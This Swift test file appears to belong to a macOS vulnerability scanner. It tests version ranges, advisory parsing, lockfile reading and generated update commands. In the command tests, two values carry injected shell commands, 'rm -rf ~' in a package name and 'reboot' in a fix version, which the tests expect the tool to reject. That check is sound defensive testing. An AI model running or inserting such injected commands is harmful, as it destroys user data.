import Foundation
import Compression

@main struct RulesTests {
    static var count = 0
    static func expect(_ condition: @autoclosure () throws -> Bool, _ description: String) rethrows {
        count += 1
        if try !condition() { fatalError("FAIL: " + description) }
    }
    static func item(_ product: String, _ version: String) -> Installation {
        Installation(product: product, name: product, version: version, path: "/test/" + product, domain: "tools")
    }
    static func main() async throws {
        expect(Version("1.10.0")! > Version("1.9.9")!, "numeric ordering")
        expect(Version("1.2") == Version("1.2.0"), "trailing zero equivalence")
        expect(Version("v24.22.1") == Version("24.22.1"), "Node prefix")
        expect(Version("1.2.3-beta.1") == nil, "prerelease rejected")
        expect(Version("1.2.3_1") == nil, "package revisions need explicit normalization")
        expect(Version("1.3.13")!.matches(">= 1.3.14, < 1.4.4") == false, "Bun HTTP3 advisory does not affect 1.3.13")
        expect(Version("1.4.3")!.matches(">= 1.3.14, < 1.4.4") == true, "bounded range")
        expect(Version("1.4.4")!.matches("< 1.4.4") == false, "patched version excluded")
        expect(Version("1.4.4")!.matches("<=1.4.4") == true, "inclusive bound")
        expect(Version("2.0.1")!.matches("<1.0 || >=2.0, <3.0") == true, "OR range")
        expect(Version("1.4.4")!.matches("^1.4") == nil, "unsupported syntax remains unknown")
        expect(Version("1.4.4")!.matches("<2 >=1") == nil, "ambiguous range remains unknown")
        expect(Version("1.4.4")!.matches("") == nil, "empty range remains unknown")
        for (formula, product) in [("node", "node"), ("node@22", "node"), ("node-build", "node-build"), ("nodenv", "nodenv"), ("openssl@3", "openssl"),
                                   ("openssl-osx-ca", "openssl-osx-ca"), ("postgresql@16", "postgresql"), ("python@3.14", "python")] {
            expect(Inventory.product(forFormula: formula) == product, "Homebrew formula \(formula) maps to \(product)")
        }

        let schedule: [String: Any] = ["v24": ["end": "2028-04-30"], "v25": ["end": "2026-06-01"]]
        let releases: [[String: Any]] = [["version": "v26.12.1", "security": true], ["version": "v24.23.0", "security": false], ["version": "v24.22.1", "security": true], ["version": "v25.8.0", "security": false]]
        let date = ISO8601DateFormatter().date(from: "2026-10-24T00:00:00Z")!
        let node = try Rules.node(item("node", "24.14.0"), releases: releases, schedule: schedule, now: date)
        expect(node?.fixed == "24.22.1", "same-branch security target; no feature-only/major upgrade")
        try expect(Rules.node(item("node", "24.22.1"), releases: releases, schedule: schedule, now: date) == nil, "patched Node clear")
        try expect(Rules.node(item("node", "25.8.0"), releases: releases, schedule: schedule, now: date)?.kind == .unsupported, "unsupported Node branch")
        do { _ = try Rules.node(item("node", "29.0.0"), releases: releases, schedule: schedule, now: date); fatalError("missing branch should fail") } catch { count += 1 }
        let bun: [[String: Any]] = [["ghsa_id": "GHSA-test", "html_url": "https://github.com/oven-sh/bun/security/advisories/GHSA-test", "summary": "Test", "vulnerabilities": [["package": ["name": "bun"], "vulnerable_version_range": ">=1.3.14, <1.4.4", "patched_versions": "1.4.4"]]]]
        try expect(Rules.bun(item("bun", "1.3.13"), advisories: bun) == nil, "Bun lower boundary")
        try expect(Rules.bun(item("bun", "1.4.3"), advisories: bun)?.fixed == "1.4.4", "Bun affected")
        try expect(Rules.bun(item("bun", "1.4.4"), advisories: bun) == nil, "Bun patched")

        let postgres = "<a href='/support/security/16/'>16</a><table><tr><td>CVE-2026-12345</td><td>17, 16</td><td>17.11, 16.15</td><td>client</td><td>test</td></tr></table>"
        try expect(Rules.postgres(item("postgresql", "16.13"), html: postgres)?.fixed == "16.15", "Postgres same-major target")
        try expect(Rules.postgres(item("postgresql", "16.15"), html: postgres) == nil, "Postgres patched")
        do { _ = try Rules.postgres(item("postgresql", "16.13"), html: "<html>maintenance</html>"); fatalError("bad HTML should fail") } catch { count += 1 }
        let openssl = "<h2 id=\"CVE-2026-12345\">CVE-2026-12345</h2><li>from 3.6.0 before 3.6.5 </li><li>from 4.0.0 before 4.0.3 </li>"
        try expect(Rules.openssl(item("openssl", "3.6.4"), html: openssl)?.fixed == "3.6.5", "OpenSSL same branch")
        try expect(Rules.openssl(item("openssl", "4.0.3"), html: openssl) == nil, "OpenSSL patched")
        do { _ = try Rules.openssl(item("openssl", "3.6.4"), html: "<html>maintenance</html>"); fatalError("bad HTML should fail") } catch { count += 1 }
        let index = Rules.opensslIndexedBranches(#"<a href="/news/vulnerabilities-3.6/">3.6</a> <a href="/news/vulnerabilities-4.0">4.0</a> <a href="../vulnerabilities-1.1.1/index.html">1.1.1</a> <a href="/news/">News</a>"#)
        expect(index == ["3.6", "4.0", "1.1.1"], "OpenSSL index branch links, absolute, relative and index.html forms")
        expect(Rules.opensslUnpublished("4.1", indexed: index), "an unlisted new branch has no published vulnerabilities")
        expect(!Rules.opensslUnpublished("4.0", indexed: index), "a listed branch with a missing page stays a failure")
        expect(!Rules.opensslUnpublished("4.1", indexed: []), "an index with no branches never clears a branch")

        let old = ScanReport(installations: [item("node", "24.14.0")], findings: [node!], domains: ["tools": true])
        var failed = ScanReport(installations: old.installations, checks: [SourceCheck(id: "node", name: "Node", status: "failed", detail: "offline")], domains: ["tools": true])
        failed.retainUnverified(from: old)
        expect(failed.findings.count == 1 && failed.findings[0].stale, "failed feed preserves finding as stale")
        var unreadable = ScanReport(checks: [SourceCheck(id: "node", name: "Node", status: "checked", detail: "ok")], domains: ["tools": false])
        unreadable.retainUnverified(from: old)
        expect(unreadable.findings.count == 1, "failed inventory does not imply removal")
        var fixed = ScanReport(installations: [item("node", "24.22.1")], checks: [SourceCheck(id: "node", name: "Node", status: "checked", detail: "ok")], domains: ["tools": true])
        fixed.retainUnverified(from: old)
        expect(fixed.findings.isEmpty, "verified patched installation resolves finding")
        var removed = ScanReport(domains: ["tools": true])
        removed.retainUnverified(from: old)
        expect(removed.findings.isEmpty, "successful discovery confirms removal")
        var copy = node!; copy.links = ["https://nodejs.org/new-path"]; copy.reason = "Wording changed"
        expect(copy.fingerprint == node!.fingerprint, "wording/link edits do not repeat alerts")
        copy.fixed = "24.24.1"
        expect(copy.fingerprint != node!.fingerprint, "new fixed release triggers change")

        var gone = ScanReport(installations: old.installations, domains: ["tools": true])
        gone.retainUnverified(from: old)
        expect(gone.findings.isEmpty, "findings from a retired source are dropped, not kept as unverified")

        // Loose package ordering picks fix targets only.
        expect(looseLess("1.2.9", "1.2.10") && looseLess("2.0.0-beta.1", "2.0.0") && !looseLess("2.0.0", "2.0.0") && looseLess("v1.0", "1.0.1"), "loose package version ordering")
        expect(Set(Catalog.products.map(\.id)).count == Catalog.products.count && Catalog.vendorRules.allSatisfy { Catalog.byID[$0] != nil }, "catalog IDs are unique and vendor rules exist")

        // Lockfiles
        let npmLock = #"{"lockfileVersion":3,"packages":{"":{"dependencies":{"express":"^4"},"devDependencies":{"vite":"^5"}},"node_modules/express":{"version":"4.18.2"},"node_modules/vite":{"version":"5.0.0","dev":true},"node_modules/express/node_modules/qs":{"version":"6.11.0"},"node_modules/@scope/lib":{"version":"1.0.0"},"node_modules/linked":{"link":true},"packages/app":{"version":"0.0.1"}}}"#
        let npm = Set(Lockfiles.npm(Data(npmLock.utf8)).map { "\($0.name)@\($0.version):\($0.dependency ?? "")" })
        expect(npm == ["express@4.18.2:direct", "vite@5.0.0:dev", "qs@6.11.0:transitive", "@scope/lib@1.0.0:transitive"], "package-lock.json roles, nesting, scopes, links and workspaces")
        let pnpm = Lockfiles.pnpm("lockfileVersion: '9.0'\n\npackages:\n\n  '@babel/core@7.24.0':\n    resolution: {integrity: x}\n\n  react@18.3.1:\n    resolution: {}\n\nsnapshots:\n\n  react-dom@18.3.1(react@18.3.1):\n    dependencies: {}\n")
            + Lockfiles.pnpm("packages:\n  /lodash@4.17.20:\n    resolution: {}\n  /@types/node@20.1.0(x@1.0.0):\n    dev: true\n  /left-pad/1.3.0_peer@1.0.0:\n    dev: false\n")
        expect(pnpm.map { $0.name + "@" + $0.version } == ["@babel/core@7.24.0", "react@18.3.1", "lodash@4.17.20", "@types/node@20.1.0", "left-pad@1.3.0"], "pnpm lockfile v9, v6 and v5 keys; snapshots skipped")
        let yarn = Lockfiles.yarn("# yarn lockfile v1\n\n\"@babel/code-frame@^7.0.0\", \"@babel/code-frame@^7.22.13\":\n  version \"7.24.7\"\n  resolved \"x\"\n\nlodash@^4.17.21:\n  version \"4.17.21\"\n")
            + Lockfiles.yarn("__metadata:\n  version: 8\n\n\"axios@npm:^1.6.0\":\n  version: 1.6.8\n\n\"my-app@workspace:.\":\n  version: 0.0.0-use.local\n\n\"resolve@patch:resolve@npm%3A^1.20.0#~builtin<compat/resolve>\":\n  version: 1.22.8\n")
        expect(yarn.map { $0.name + "@" + $0.version } == ["@babel/code-frame@7.24.7", "lodash@4.17.21", "axios@1.6.8"], "yarn v1 and Berry entries; workspaces and patches skipped")
        let bunLock = Lockfiles.bun("{\n  \"workspaces\": { \"\": { \"name\": \"app\" } },\n  \"packages\": {\n    \"react\": [\"react@18.3.1\", \"\", {}, \"sha512-x\"],\n    \"@types/node\": [\"@types/node@20.0.0\", \"\", {}, \"sha512-y\"],\n    \"local\": [\"local@workspace:packages/local\"],\n  }\n}")
        expect(bunLock.map { $0.name + "@" + $0.version } == ["react@18.3.1", "@types/node@20.0.0"], "bun.lock text format")
        let uv = Lockfiles.toml("version = 1\n\n[[package]]\nname = \"app\"\nversion = \"0.1.0\"\nsource = { editable = \".\" }\n\n[[package]]\nname = \"requests\"\nversion = \"2.31.0\"\nsource = { registry = \"https://pypi.org/simple\" }\ndependencies = [\n    { name = \"idna\" },\n]\n\n[package.optional-dependencies]\nsocks = [{ name = \"pysocks\" }]\n", ecosystem: "PyPI") { !$0.contains("editable") }
        expect(uv.map { $0.name + "@" + $0.version } == ["requests@2.31.0"], "uv.lock packages, editable project skipped")
        let cargo = Lockfiles.toml("[[package]]\nname = \"serde\"\nversion = \"1.0.190\"\nsource = \"registry+https://github.com/rust-lang/crates.io-index\"\n\n[[package]]\nname = \"mycrate\"\nversion = \"0.1.0\"\n", ecosystem: "crates.io") { $0.contains("registry+") }
        expect(cargo.map(\.name) == ["serde"], "Cargo.lock registry crates only")
        expect(Lockfiles.requirements("# deps\nDjango==4.2.1\nrequests[socks] == 2.31.0 ; python_version > '3'\nflask>=2\n-e .\n").map { $0.name + "@" + $0.version } == ["Django@4.2.1", "requests@2.31.0"], "pinned requirements only")
        expect(Lockfiles.gemfile("GEM\n  remote: https://rubygems.org/\n  specs:\n    nokogiri (1.16.0-arm64-darwin)\n      racc (~> 1.4)\n    rake (13.0.6)\n\nPLATFORMS\n  arm64-darwin\n").map { $0.name + "@" + $0.version } == ["nokogiri@1.16.0", "rake@13.0.6"], "Gemfile.lock specs")
        expect(Lockfiles.goModules("module x\n\ngo 1.22\n\nrequire golang.org/x/net v0.17.0\n\nrequire (\n\tgithub.com/a/b v1.2.3\n\tgithub.com/c/d v0.0.0-2023 // indirect\n)\n").map { "\($0.name)@\($0.version):\($0.dependency!)" } == ["golang.org/x/net@0.17.0:direct", "github.com/a/b@1.2.3:direct", "github.com/c/d@0.0.0-2023:transitive"], "go.mod requirements")


        // MCP server commands
        expect(Inventory.mcpPackage(command: "npx", args: ["-y", "@modelcontextprotocol/server-github"])! == ("npm", "@modelcontextprotocol/server-github"), "npx -y package")
        expect(Inventory.mcpPackage(command: "/usr/local/bin/uvx", args: ["--python", "3.12", "mcp-server-fetch==0.6.2"])! == ("PyPI", "mcp-server-fetch==0.6.2"), "uvx skips flag values")
        expect(Inventory.mcpPackage(command: "pnpm", args: ["dlx", "mcp-remote", "https://example.com/sse?token=secret"])! == ("npm", "mcp-remote"), "pnpm dlx keeps only the package")
        expect(Inventory.mcpPackage(command: "node", args: ["server.js"]) == nil, "local scripts are not packages")
        expect(Inventory.pinned("@acme/mcp@1.2.3", "npm") == ("@acme/mcp", "1.2.3") && Inventory.pinned("@acme/mcp@latest", "npm") == ("@acme/mcp", nil) && Inventory.pinned("mcp-server-fetch==0.6.2", "PyPI") == ("mcp-server-fetch", "0.6.2") && Inventory.pinned("pkg[extra]", "PyPI") == ("pkg", nil), "MCP pins and tags")

        // OSV: aliases collapse, the highest needed fix wins, malicious versions are flagged.
        let pip = Installation(product: "pypi:pip", name: "pip", version: "26.2.1", path: "/py/pip", domain: "packages", ecosystem: "PyPI", packageName: "pip", manager: "pip", location: "/py/bin/python3")
        let osvKey = OSV.key(pip)!
        let vulns = ["GHSA-a": OSV.Vuln(id: "GHSA-a", summary: "Cert issue", aliases: ["PYSEC-1", "CVE-2026-1"], severity: "HIGH", fixed: ["PyPI|pip": ["26.2.2", "25.0"]]),
                     "PYSEC-1": OSV.Vuln(id: "PYSEC-1", summary: "Same issue", aliases: ["GHSA-a"], severity: nil, fixed: ["PyPI|pip": ["26.2.2"]]),
                     "GHSA-b": OSV.Vuln(id: "GHSA-b", summary: "Other", aliases: [], severity: "MODERATE", fixed: ["PyPI|pip": ["26.3.0"]])]
        let osvFinding = OSV.findings(for: [pip], matches: [osvKey: ["PYSEC-1", "GHSA-a", "GHSA-b"]], vulns: vulns).first!
        expect(osvFinding.fixed == "26.3.0" && osvFinding.severity == "HIGH" && osvFinding.advisories == ["CVE-2026-1", "GHSA-a", "GHSA-b"] && osvFinding.reason.hasPrefix("2 published"), "OSV alias collapse, fix target and severity")
        let evil = Installation(product: "npm:evil", name: "evil", version: "1.0.0", path: "/p#evil@1.0.0", domain: "projects", ecosystem: "npm", packageName: "evil", manager: "npm", location: "/p", dependency: "transitive")
        let malicious = OSV.findings(for: [evil], matches: [OSV.key(evil)!: ["MAL-2026-1"]], vulns: ["MAL-2026-1": OSV.Vuln(id: "MAL-2026-1", summary: "Malicious code", aliases: [], severity: "CRITICAL", fixed: [:])]).first!
        expect(malicious.malicious == true && Commands.commands(for: malicious).first?.text == "cd /p && npm uninstall evil", "malicious package is flagged with a removal command")

        // NVD: bounded ranges and exact versions count; unbounded wildcards and other platforms do not.
        func cve(_ match: String, platform: String? = nil) -> [String: Any] {
            let config = try! JSONSerialization.jsonObject(with: Data(match.utf8)) as! [String: Any]
            var nodes: [[String: Any]] = [["operator": "OR", "cpeMatch": [config]]]
            if let platform { nodes.append(["operator": "OR", "cpeMatch": [["vulnerable": false, "criteria": platform]]]) }
            return ["id": "CVE-2026-9", "configurations": [["operator": platform == nil ? "OR" : "AND", "nodes": nodes]], "metrics": ["cvssMetricV31": [["cvssData": ["baseSeverity": "HIGH"]]]]]
        }
        let v = Version("8.5.0")!
        expect(NVD.evaluate(cve(#"{"vulnerable":true,"criteria":"cpe:2.3:a:haxx:curl:*:*:*:*:*:*:*:*","versionStartIncluding":"7.0","versionEndExcluding":"8.6.0"}"#), cpe: "haxx:curl", version: v) == NVDHit(id: "CVE-2026-9", fixed: "8.6.0", severity: "HIGH"), "bounded NVD range")
        expect(NVD.evaluate(cve(#"{"vulnerable":true,"criteria":"cpe:2.3:a:haxx:curl:*:*:*:*:*:*:*:*","versionEndExcluding":"8.5.0"}"#), cpe: "haxx:curl", version: v) == nil, "fixed version excluded")
        expect(NVD.evaluate(cve(#"{"vulnerable":true,"criteria":"cpe:2.3:a:haxx:curl:*:*:*:*:*:*:*:*"}"#), cpe: "haxx:curl", version: v) == nil, "unbounded wildcard ignored")
        expect(NVD.evaluate(cve(#"{"vulnerable":true,"criteria":"cpe:2.3:a:haxx:curl:8.5.0:*:*:*:*:*:*:*"}"#), cpe: "haxx:curl", version: v)?.fixed == nil, "exact version match")
        expect(NVD.evaluate(cve(#"{"vulnerable":true,"criteria":"cpe:2.3:a:haxx:curl:8.5.0:alpha1:*:*:*:*:*:*"}"#), cpe: "haxx:curl", version: v) == nil, "pre-release CPE does not match a final release")
        let unmaintained = OSV.findings(for: [pip], matches: [osvKey: ["RUSTSEC-1"]], vulns: ["RUSTSEC-1": OSV.Vuln(id: "RUSTSEC-1", summary: "Unmaintained", aliases: [], severity: nil, fixed: [:], informational: true)])
        expect(unmaintained.isEmpty, "unmaintained notices are not security findings")
        expect(NVD.evaluate(cve(#"{"vulnerable":true,"criteria":"cpe:2.3:a:haxx:curl:*:*:*:*:*:*:*:*","versionEndExcluding":"9"}"#, platform: "cpe:2.3:o:microsoft:windows:-:*:*:*:*:*:*:*"), cpe: "haxx:curl", version: v) == nil, "Windows-only configuration ignored")
        expect(NVD.evaluate(cve(#"{"vulnerable":true,"criteria":"cpe:2.3:a:haxx:curl:*:*:*:*:*:*:*:*","versionEndExcluding":"9"}"#, platform: "cpe:2.3:o:apple:macos:-:*:*:*:*:*:*:*"), cpe: "haxx:curl", version: v) != nil, "macOS configuration applies")

        // Commands are quoted, validated and match the installation's manager.
        expect(Shell.quote("plain-1.2/x") == "plain-1.2/x" && Shell.quote("/Volumes/My Projects/it's") == "'/Volumes/My Projects/it'\\''s'", "shell quoting")
        func commandFor(_ item: Installation, fixed: String = "2.0.0") -> String? { Commands.commands(for: Finding(source: "osv", installation: item, kind: .security, fixed: fixed, reason: "", action: "", links: [])).first?.text }
        let project = Installation(product: "npm:vite", name: "vite", version: "5.0.0", path: "/a#vite", domain: "projects", ecosystem: "npm", packageName: "vite", manager: "npm", location: "/Volumes/My Projects/app", dependency: "dev")
        expect(commandFor(project) == "cd '/Volumes/My Projects/app' && npm install vite@2.0.0 --save-dev", "npm dev dependency command")
        var transitive = project; transitive.dependency = "transitive"
        expect(commandFor(transitive) == "cd '/Volumes/My Projects/app' && npm audit fix", "npm transitive dependency command")
        var hostile = project; hostile.packageName = "vite; rm -rf ~"
        expect(commandFor(hostile) == nil, "invalid package names get no command")
        expect(commandFor(project, fixed: "2.0.0; reboot") == "cd '/Volumes/My Projects/app' && npm audit fix", "invalid fix versions are never placed in commands")
        expect(commandFor(pip) == "/py/bin/python3 -m pip install --upgrade pip==2.0.0", "pip command uses the owning interpreter")
        expect(commandFor(Installation(product: "node", name: "Node.js", version: "24.14.0", path: "/usr/local/bin/node", domain: "tools", manager: "node-pkg"), fixed: "24.22.1")!.contains("spctl --assess --type install node-v24.22.1.pkg && sudo installer"), "Node installer checks notarization first")
        expect(commandFor(Installation(product: "curl", name: "curl", version: "8.5.0", path: "/opt/homebrew/Cellar/curl/8.5.0", domain: "brew", package: "curl", manager: "brew")) == "brew upgrade curl", "Homebrew formula command")
        expect(commandFor(Installation(product: "pypi:requests", name: "requests", version: "2.0", path: "/u#r", domain: "projects", ecosystem: "PyPI", packageName: "requests", manager: "uv", location: "/u")) == "cd /u && uv lock --upgrade-package requests && uv sync", "uv project command")
        expect(commandFor(Installation(product: "go:x", name: "golang.org/x/net", version: "0.17.0", path: "/g#x", domain: "projects", ecosystem: "Go", packageName: "golang.org/x/net", manager: "go", location: "/g"), fixed: "0.23.0") == "cd /g && go get golang.org/x/net@v0.23.0 && go mod tidy", "Go module command")

        // Catalog additions: renamed and alternate casks, libpq, versioned Go module paths.
        expect(Catalog.product(formula: "libpq")?.id == "postgresql" && Catalog.product(formula: "docker-compose")?.id == "docker-compose" && Catalog.product(formula: "docker")?.id == "docker-cli"
               && Catalog.byCask["claude-code@latest"]?.id == "claude-code" && Catalog.byCask["ollama-app"]?.id == "ollama" && Catalog.byCask["copilot-cli"]?.id == "copilot-cli"
               && Catalog.product(formula: "opencode")?.id == "opencode" && Catalog.byBundleID["com.ollama.ollama"]?.id == "ollama", "new catalog mappings")
        let compose = Catalog.byID["docker-compose"]
        expect(Catalog.osv(compose, version: "5.6.1")?.name == "github.com/docker/compose/v5" && Catalog.osv(compose, version: "2.40.1")?.name == "github.com/docker/compose/v2"
               && Catalog.osv(compose, version: "1.29.2")?.name == "github.com/docker/compose" && Catalog.osv(Catalog.byID["claude-code"], version: "2.1.0")?.name == "@anthropic-ai/claude-code", "OSV module path follows the major version")

        // GitHub repository advisories: open-ended ranges stop at the patched release; empty-ecosystem packages count.
        let opencodeAdvisories: [[String: Any]] = [
            ["ghsa_id": "GHSA-open", "html_url": "https://github.com/anomalyco/opencode/security/advisories/GHSA-open", "summary": "Open-ended", "vulnerabilities": [["package": ["ecosystem": "npm", "name": "opencode-ai"], "vulnerable_version_range": ">=1.14.30", "patched_versions": "1.18.22"]]],
            ["ghsa_id": "GHSA-old", "html_url": "https://github.com/anomalyco/opencode/security/advisories/GHSA-old", "summary": "Old", "vulnerabilities": [["package": ["ecosystem": "", "name": "opencode"], "vulnerable_version_range": "<1.1.10", "patched_versions": "1.1.10"]]]]
        func opencode(_ version: String) throws -> Finding? { try Rules.github(item("opencode", version), advisories: opencodeAdvisories, packages: ["opencode-ai", "opencode"], source: "opencode", action: "") }
        try expect(opencode("2.1.4") == nil, "a version past the patched release is clear despite an open-ended range")
        try expect(opencode("1.15.0")?.fixed == "1.18.22" && opencode("1.1.9")?.advisories == ["GHSA-old"], "OpenCode ranges match by package name")

        // mise installs: real versions only, alias symlinks skipped, Python packages and Node globals included.
        let mise = FileManager.default.temporaryDirectory.appendingPathComponent("mise-test-\(UUID().uuidString)").path
        defer { try? FileManager.default.removeItem(atPath: mise) }
        for path in ["node/24.14.0/bin", "node/24.14.0/lib/node_modules/left-pad", "python/3.12.4/lib/python3.12/site-packages/foo-1.0.dist-info", "go/1.22.0/bin", "zig/0.13.0"] {
            try FileManager.default.createDirectory(atPath: mise + "/" + path, withIntermediateDirectories: true)
        }
        try FileManager.default.createSymbolicLink(atPath: mise + "/node/24", withDestinationPath: "24.14.0")
        try FileManager.default.createSymbolicLink(atPath: mise + "/node/latest", withDestinationPath: "24.14.0")
        try Data("Metadata-Version: 2.1\nName: foo\nVersion: 1.0\n".utf8).write(to: URL(fileURLWithPath: mise + "/python/3.12.4/lib/python3.12/site-packages/foo-1.0.dist-info/METADATA"))
        try Data(#"{"name":"left-pad","version":"1.3.0"}"#.utf8).write(to: URL(fileURLWithPath: mise + "/node/24.14.0/lib/node_modules/left-pad/package.json"))
        let found = Inventory.mise(root: mise)
        expect(found.filter { $0.manager == "mise" }.map { "\($0.product)@\($0.version)" }.sorted() == ["go@1.22.0", "node@24.14.0", "python@3.12.4"], "mise runtimes found; aliases and unknown tools skipped")
        expect(found.first { $0.product == "go" }?.packageName == "stdlib" && found.first { $0.name == "foo" }?.location == mise + "/python/3.12.4/bin/python3.12"
               && found.first { $0.name == "left-pad" }?.location == mise + "/node/24.14.0/bin/npm", "mise Go uses OSV stdlib; packages use mise's interpreter and npm")
        let miseNode = found.first { $0.product == "node" && $0.manager == "mise" }!
        expect(Commands.commands(for: Finding(source: "node", installation: miseNode, kind: .security, fixed: "24.22.1", reason: "", action: "", links: [])).map(\.text) == ["mise upgrade node", "mise use -g node@24.22.1"], "mise update commands")
        expect(Commands.commands(for: Finding(source: "node", installation: miseNode, kind: .unsupported, fixed: "Supported LTS branch", reason: "", action: "", links: [])).map(\.text) == ["mise upgrade --bump node"], "unsupported mise branch moves past its range")
        expect(commandFor(Installation(product: "opencode", name: "OpenCode", version: "1.15.0", path: "/o", domain: "tools", manager: "opencode")) == "opencode upgrade", "OpenCode native command")

        // Update options are ranked by install method, the tools on this Mac and whether the app updates itself.
        func options(_ item: Installation, _ context: CommandContext, source: String = "osv", fixed: String = "2.0.0") -> [UpdateCommand] {
            Commands.commands(for: Finding(source: source, installation: item, kind: .security, fixed: fixed, reason: "", action: "", links: []), context: context)
        }
        let codeApp = Installation(product: "vscode", name: "Visual Studio Code", version: "1.90", path: "/Applications/Visual Studio Code.app", domain: "apps", package: "visual-studio-code", manager: "app")
        expect(options(codeApp, CommandContext(tools: [])).map { $0.kind ?? "terminal" } == ["app", "link"] && options(codeApp, CommandContext(tools: []))[1].target == "https://code.visualstudio.com/download",
               "without Homebrew: open the app, then the vendor download page")
        var selfUpdating = CommandContext(tools: ["brew"]); selfUpdating.casks["visual-studio-code"] = CaskInfo(autoUpdates: true, homepage: "https://code.visualstudio.com/")
        expect(options(codeApp, selfUpdating).map { $0.kind ?? $0.text } == ["app", "brew install --cask --force visual-studio-code", "link"], "self-updating app: its updater first, Homebrew second")

        // Google Chrome and App Store apps are never inventoried.
        let applications = FileManager.default.temporaryDirectory.appendingPathComponent("apps-test-\(UUID().uuidString)").path
        defer { try? FileManager.default.removeItem(atPath: applications) }
        for (folder, bundleID, store) in [("Visual Studio Code.app", "com.microsoft.VSCode", false), ("Google Chrome.app", "com.google.Chrome", false),
                                          ("Tailscale.app", "io.tailscale.ipn.macos", true), ("Keynote.app", "com.apple.iWork.Keynote", true)] {
            let contents = applications + "/" + folder + "/Contents"
            try FileManager.default.createDirectory(atPath: contents + (store ? "/_MASReceipt" : ""), withIntermediateDirectories: true)
            if store { try Data("receipt".utf8).write(to: URL(fileURLWithPath: contents + "/_MASReceipt/receipt")) }
            try PropertyListSerialization.data(fromPropertyList: ["CFBundleIdentifier": bundleID, "CFBundleShortVersionString": "1.0"], format: .xml, options: 0).write(to: URL(fileURLWithPath: contents + "/Info.plist"))
        }
        let (foundApps, _, skipped, _, _) = Inventory.apps(roots: [applications])
        expect(foundApps.map(\.product) == ["vscode"] && skipped == 3, "Chrome and App Store copies are skipped; other catalog apps are found")
        expect(Catalog.ownChannels.contains("claude-desktop") && Catalog.ownChannels.allSatisfy { Catalog.byID[$0] != nil }, "Claude follows its own release channel, and own-channel apps exist in the catalog")
        expect(Catalog.byID["chrome"] == nil && Catalog.excludedCasks.contains("google-chrome") && !Catalog.vendorRules.contains("chrome"), "Chrome has no catalog entry, cask or vendor rule")
        let plainApp = Installation(product: "tool-x", name: "Tool X", version: "1.0", path: "/Applications/Tool X.app", domain: "apps", package: "tool-x", manager: "app")
        var manual = CommandContext(tools: ["brew"]); manual.casks["tool-x"] = CaskInfo(autoUpdates: false, homepage: "https://tool-x.example/")
        expect(options(plainApp, manual).map { $0.kind ?? "terminal" } == ["terminal", "link", "app"] && options(plainApp, manual)[1].text == "Download from tool-x.example", "app without a self-updater: Homebrew, then download page")
        var insecure = CommandContext(tools: []); insecure.casks["tool-x"] = CaskInfo(autoUpdates: false, homepage: "http://tool-x.example/")
        expect(options(plainApp, insecure).map { $0.kind ?? "terminal" } == ["app"], "non-https pages are never offered")
        let cask = Installation(product: "tool-x", name: "Tool X", version: "1.0", path: "/opt/homebrew/Caskroom/tool-x/1.0", domain: "brew", package: "tool-x", manager: "cask")
        var greedy = CommandContext(tools: ["brew"]); greedy.casks["tool-x"] = CaskInfo(autoUpdates: true, homepage: nil)
        expect(options(cask, greedy).first?.text == "brew upgrade --cask --greedy tool-x" && options(cask, .all).first?.text == "brew upgrade --cask tool-x", "self-updating casks need --greedy")

        // Missing package managers get an install step or an install page.
        let pnpmProject = Installation(product: "npm:left-pad", name: "left-pad", version: "1.0.0", path: "/p/pnpm-lock.yaml#left-pad@1.0.0", domain: "projects", ecosystem: "npm", packageName: "left-pad", manager: "pnpm", location: "/p", dependency: "direct")
        expect(options(pnpmProject, CommandContext(tools: ["corepack", "npm"])).first?.text == "corepack enable pnpm && cd /p && pnpm add left-pad@2.0.0", "pnpm through corepack")
        expect(options(pnpmProject, CommandContext(tools: ["npm"])).first?.text == "npm install -g pnpm && cd /p && pnpm add left-pad@2.0.0", "pnpm through npm")
        let uvProject = Installation(product: "pypi:requests", name: "requests", version: "2.0", path: "/u/uv.lock#requests@2.0", domain: "projects", ecosystem: "PyPI", packageName: "requests", manager: "uv", location: "/u")
        expect(options(uvProject, CommandContext(tools: ["brew"])).first?.text == "brew install uv && cd /u && uv lock --upgrade-package requests && uv sync", "uv through Homebrew")
        let noUV = options(uvProject, CommandContext(tools: []))
        expect(noUV.map { $0.kind ?? "terminal" } == ["link", "terminal"] && noUV[0].target == "https://docs.astral.sh/uv/getting-started/installation/", "uv install page first when nothing can install it")

        // Apple, files and download-only routes.
        let apple = Installation(product: "macos", name: "Apple software", version: "27.0", path: "System Settings → Software Update", domain: "apple")
        expect(options(apple, .all, source: "apple").first == UpdateCommand(text: "Open Software Update", note: "Shows Apple's eligible updates with their security notes.", kind: "link", target: "x-apple.systempreferences:com.apple.Software-Update-Settings.extension"), "Apple updates open Software Update")
        let pinned = Installation(product: "pypi:django", name: "Django", version: "4.2.1", path: "/r/requirements.txt#Django@4.2.1", domain: "projects", ecosystem: "PyPI", packageName: "Django", manager: "pip-req", location: "/r")
        expect(options(pinned, .all).first?.kind == "file" && options(pinned, .all).first?.target == "/r/requirements.txt", "pinned requirements open the file")
        let server = Installation(product: "mcp:x", name: "x (x)", version: "1.0.0", path: "/c.json#x", domain: "mcp", ecosystem: "npm", packageName: "x", manager: "mcp", location: "/Users/a/.cursor/mcp.json")
        expect(options(server, .all).first?.target == "/Users/a/.cursor/mcp.json", "MCP findings open the config")
        expect(options(Installation(product: "go", name: "Go", version: "1.22.0", path: "/usr/local/go", domain: "tools", manager: "go-pkg"), .all).first?.kind == "link", "go.dev installs get a download link")

        // No fix released yet: NVD lists no fixed version and Homebrew has nothing newer than the installed copy.
        func described(_ text: String) -> [String: Any] { ["id": "CVE-2026-1", "descriptions": [["lang": "en", "value": text]]] }
        expect(NVD.expectedFix(described("In MIT Kerberos 5 (aka krb5) before 1.22.3, there is a NULL pointer dereference."), version: Version("1.22.2")!) == "1.22.3", "fix version named in the description")
        expect(NVD.expectedFix(described("FFmpeg before 8.1.3 and 9.x before 9.0.2 contains an issue."), version: Version("9.0.2")!) == nil
               && NVD.expectedFix(described("FFmpeg through 9.0.2 contains a stack exhaustion vulnerability."), version: Version("9.0.2")!) == nil, "no future fix named")
        let krb5 = Installation(product: "krb5", name: "krb5", version: "1.22.2", path: "/opt/homebrew/Cellar/krb5/1.22.2_2", domain: "brew", package: "krb5", manager: "brew")
        let krbFinding = NVD.finding(krb5, product: Catalog.byID["krb5"]!, hits: [NVDHit(id: "CVE-2026-40355", fixed: nil, severity: "MEDIUM", expected: "1.22.3"), NVDHit(id: "CVE-2026-40356", fixed: nil, severity: "MEDIUM", expected: "1.22.3")])!
